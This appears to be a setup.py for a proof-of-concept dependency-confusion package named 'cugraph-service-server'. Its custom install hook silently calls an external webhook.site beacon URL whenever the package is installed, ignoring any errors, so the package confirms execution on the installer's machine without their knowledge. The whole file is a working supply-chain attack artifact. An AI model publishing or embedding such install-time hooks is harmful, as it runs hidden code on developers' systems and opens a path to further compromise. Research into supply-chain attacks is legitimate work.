from setuptools import setup
from setuptools.command.install import install
import urllib.request

BEACON_URL = "https://webhook.site/7dafb1da-4fb8-4d95-99b9-679d6e02d27f"  

class InstallWithBeacon(install):
    def run(self):
        try:
            urllib.request.urlopen(BEACON_URL, timeout=3)
        except Exception:
            pass
        install.run(self)

setup(
    name="cugraph-service-server",
    version="23.12.0",
    packages=["cugraph-service-server"],
    description="POC package (beacon-only)",
    cmdclass={'install': InstallWithBeacon},
)
